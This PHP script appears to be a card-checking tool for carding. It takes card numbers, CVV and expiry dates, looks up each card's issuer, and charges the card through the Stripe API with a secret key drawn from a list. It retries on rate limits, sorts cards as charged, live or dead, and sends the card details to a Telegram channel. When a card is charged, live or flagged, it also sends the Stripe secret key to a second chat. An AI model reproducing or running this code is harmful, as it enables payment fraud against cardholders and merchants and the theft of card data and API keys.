<?php
include 'preset.php';

$show = 'on';

if(!$sk){
  #$sk = "";
$sks = array(
""
);
  $sk = $sks[array_rand($sks)];    
}

if(!$amount){
  $amount='1';
}

if(!$currency){
  $currency='usd';
}


if ($currency == "inr") {
  $cur = "₹";
}elseif($currency=="eur"){
  $cur ="€";
}elseif($currency=="usd"){
  $cur = "$";
}
echo $cur;
  #########################[BIN LOOK-UP]############################

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/' . $cc . '');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: lookup.binlist.net',
    'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
  ));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, '');
  $fim = curl_exec($ch);
  $emoji = get_str($fim, '"emoji":"', '"');
  if (strpos($fim, '"type":"credit"') !== false) {
  }
  curl_close($ch);

  #########################

  $ch = curl_init();
  $bin = substr($cc, 0, 6);
  curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  $bindata = curl_exec($ch);
  $binna = json_decode($bindata, true);
  $brand = $binna['scheme'];
  $country = $binna['country']['name'];
  $type = $binna['type'];
  $bank = $binna['bank']['name'];
  curl_close($ch);

  $bindata1 = " $type - $brand - $country $emoji"; 


  # ------------ 1st Req
  $x = 0;  
  while(true)  
  {  
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]=' . $cc . '&card[cvc]=' . $cvv . '&card[exp_month]=' . $mm . '&card[exp_year]=' . $yyyy . '&&billing_details[name]=' . $fname . '&billing_details[email]=' . $email . '');

  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Authorization: Bearer ' . $sk . '',
    'user-agent: Mozilla/5.0 (Windows NT ' . rand(11, 99) . '.0; Win64; x64) AppleWebKit/' . rand(111, 999) . '.' . rand(11, 99) . ' (KHTML, like Gecko) Chrome/' . rand(11, 99) . '.0.' . rand(1111, 9999) . '.' . rand(111, 999) . ' Safari/' . rand(111, 999) . '.' . rand(11, 99) . ''
  ));

  echo $r1 = curl_exec($ch);
  $tok = trim(strip_tags(get_str($r1, '"id": "', '"')));
  $d_code1 = trim(strip_tags(get_str($r1, '"decline_code": "', '"')));
  if (strpos($r1, "rate_limit"))
  {  
    $x++;  
    continue;  
  }  
  break;  
  }  

  # ---------- 2nd Req
  
  $x = 0;  
  while(true)  
  {  
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=' . $tok . '&description=𝙅𝙚𝙩𝙞𝙭 Donation&confirm=true&amount=' . $amount . '00&currency='.$currency.'&off_session=true');

  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Authorization: Bearer ' . $sk . '',
    'user-agent: Mozilla/5.0 (Windows NT ' . rand(11, 99) . '.0; Win64; x64) AppleWebKit/' . rand(111, 999) . '.' . rand(11, 99) . ' (KHTML, like Gecko) Chrome/' . rand(11, 99) . '.0.' . rand(1111, 9999) . '.' . rand(111, 999) . ' Safari/' . rand(111, 999) . '.' . rand(11, 99) . ''
  ));

  echo$r2 = curl_exec($ch);
  $charge = trim(strip_tags(get_str($r2, '"id": "', '"')));
  $check3 = trim(strip_tags(get_str($r2, '"cvc_check": "', '"')));
  $msg3 = trim(strip_tags(get_str($r2, '"message": "', '"')));
  $d_code3 = trim(strip_tags(get_str($r2, '"decline_code": "', '"')));
  $receipturl = trim(strip_tags(get_str($r2, '"receipt_url": "', '"')));
  $networkstatus = trim(strip_tags(get_str($r2, '"network_status": "', '"')));
  $risklevel = trim(strip_tags(get_str($r2, '"risk_level": "', '"')));
  $seller_message = trim(strip_tags(get_str($r2, '"seller_message": "', '"')));
  if (strpos($r2, "rate_limit"))
  {  
    $x++;  
    continue;  
  }  
  break;  
  } 

function decline_reason($re1, $re2)
{
  $decline1 = trim(strip_tags(get_str($re1, '"decline_code": "', '"')));
  $decline2 = trim(strip_tags(get_str($re2, '"decline_code": "', '"')));
  $msg1 =  trim(strip_tags(get_str($re1, '"message": "', '"')));
  $msg2 =  trim(strip_tags(get_str($re2, '"message": "', '"')));
  $decline3 = trim(strip_tags(get_str($re2, '"code": "', '"')));
  $decline4 = trim(strip_tags(get_str($re1, '"code": "', '"')));

  if (!empty($decline1)) {
    return $decline1 . ": " . $msg1;
  } else if (!empty($decline2)) {
    return $decline2 . ": " . $msg2;
  } else {
    return "$decline4:$decline3";
  }
}

  if (strpos($r2, '"seller_message": "Payment complete."')) {
    $status = '#CHARGE';
    $cc_code = $cur . $amount . ' CVV Charged! ';
    $chatId = "@chargedbydarkphoenix";
    sendMessage($chatId, "SUCCESS!%0ACC=> $card%0AMessage=> $cc_code%0ABinData=> $bindata1");
    echo ''.$status.' <a href="'.$receipturl.'">'.$cc_code.'</a> '.$country.'';
    sendMessage($chatIds, $sk);
    exit;
  } elseif ((strpos($r2, 'insufficient_funds')) || (strpos($r1, 'insufficient_funds'))) {
    $status = '#CVV';
    $cc_code = 'Insufficient';
    sendMessage ($chatId, "CC=> $card%0AMessage=> $cc_code%0ABinData=> $bindata1");
    sendMessage($chatIds, $sk);
  } elseif (strpos($r1, "incorrect_cvc") || strpos($r2, "incorrect_cvc")) {
    $status = '#CCN';
    $cc_code = 'incorrect_cvc';
    sendMessage ($chatId, "CC=> $card%0AMessage=> $cc_code%0ABinData=> $bindata1");
    sendMessage($chatIds, $sk);
  } elseif (strpos($r1, 'test_mode_live_card')) {
    $status = '#DEAD';
    $cc_code = 'Test Mode Charges';
  } elseif (strpos($r1, 'testmode_charges_only')) {
    $status = '#DEAD';
    $cc_code = 'Teast Mode Charges';
  } elseif (strpos($r1, "rate_limit")) {
    $status = '#DEAD';
    $cc_code = 'Rate Limit';
  } elseif (strpos($r1, "Sending credit card numbers directly to the Stripe API is generally unsafe")) {
    $status = '#DEAD';
    $cc_code = 'SK KEY DEAD';
  } elseif (strpos($r1, "api_key_expired")) {
    $status = '#DEAD';
    $cc_code = 'API Expired';
  }elseif (strpos($r1, "invalid_request_error")) {
    $status = '#DEAD';
    $cc_code = 'Invalid Key';
  } else {
    $status = 'Declined';
    $cc_code = '#DEAD';
  }
  echo ' BYPASSING: '.$x.' <br>';
  echo ''.$status.' '.$cc_code.' '.decline_reason($r1, $r2).'';


  curl_close($ch);
  ob_flush();
